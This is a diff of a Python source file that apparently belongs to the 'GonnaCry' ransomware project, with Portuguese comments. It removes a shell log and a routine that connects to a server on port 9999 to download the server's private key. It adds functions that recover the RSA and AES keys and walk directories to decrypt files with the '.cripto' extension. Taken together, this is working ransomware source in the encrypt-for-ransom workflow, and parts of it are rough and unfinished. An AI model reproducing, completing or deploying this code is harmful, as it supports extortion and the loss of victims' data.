@@ -39,77 +39,29 @@ Brincadeira, apenas digite 1.
 def bitcoin_addr():
     pass
 
-'''
->>> shutil.copytree('Ransomware','~/Desktop/GonnaCry')
->>> shutil.copytree('Ransomware','/home/tarcisio/Desktop/GonnaCry')
->>> shutil.copytree('Ransomware',os.environ['HOME']+'Desktop/GonnaCry')
-Traceback (most recent call last):
-  File "<stdin>", line 1, in <module>
-NameError: name 'os' is not defined
->>> import o
-Traceback (most recent call last):
-  File "<stdin>", line 1, in <module>
-ImportError: No module named o
->>> import os
->>> shutil.copytree('Ransomware',os.environ['HOME']+'Desktop/GonnaCry')
-Traceback (most recent call last):
-  File "<stdin>", line 1, in <module>
-  File "/usr/lib/python2.7/shutil.py", line 177, in copytree
-    os.makedirs(dst)
-  File "/usr/lib/python2.7/os.py", line 150, in makedirs
-    makedirs(head, mode)
-  File "/usr/lib/python2.7/os.py", line 157, in makedirs
-    mkdir(name, mode)
-OSError: [Errno 13] Permission denied: '/home/tarcisioDesktop'
->>> shutil.copytree('Ransomware',os.environ['HOME']+'/Desktop/GonnaCry')
->>>
+def decrypt_all():
+    client('localhost')
+    SRSA_to_RSA()
+    print('[*] chave privada do cliente descriptografada')
+    RSA_to_AES()
+    print('[*] chave AES descriptografada')
 
+    f = open('keys/AES.txt','r')
+    a = f.read()
+    tam = len(a)
+    if(tam == 30):
+        adsas = 1
+        #menu(a,2)
+        
+def decrypt(diretorio):
+    for caminho, diretorio, arquivo in os.walk(diretorio):
+        for arq in arquivo:
+            a = caminho+'/'+arq
+            extensao = os.path.splitext(a)
+            if(extensao[1] == '.cripto'):
+                a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
+                descriptografa(chave_AES,a)
 
-
-'''
-
-
-def identificador(pergunta):
-    os.system('clear')
-    if(pergunta == 'ajuda' or pergunta == 'help'):
-        print(ajuda)
-
-    elif(pergunta == '1' or pergunta == 'sim' or pergunta == 's'):
-        conect_to_serv()
-
-
-def conect_to_serv(IP_serv = 'localhost'):
-    f = open('caminho_gc.txt','r')
-    caminho = f.read()
-    if(os.path.isdir(caminho)):
-        os.chdir(caminho)
-        os.listdir(os.getcwd())
-
-    try:
-        s = socket.socket()
-        s.connect((IP_serv,9999))
-    except socket.error as e:
-        print('Erro de conexão: '+str(e))
-        print('Tente mais tarde')
-        exit()
-    l = s.recv(1024)
-    f = open ("keys/CHAVE_PRIVADA_SERVIDOR.txt", "wb")
-    while (l):
-        f.write(l)
-        l = s.recv(1024)
-    f.close()
-    s.close()
-
-
-def chat():
-    while True:
-        try:
-            pergunta = raw_input('\33[94m~> \033[0m')
-            identificador(pergunta.lower())
-        except KeyboardInterrupt:
-            a = raw_input('deseja sair? ')
-            if(a == 'sim' or a == 's' or a == '1'):
-                exit()
 
 if __name__ == '__main__':
     os.system('clear')
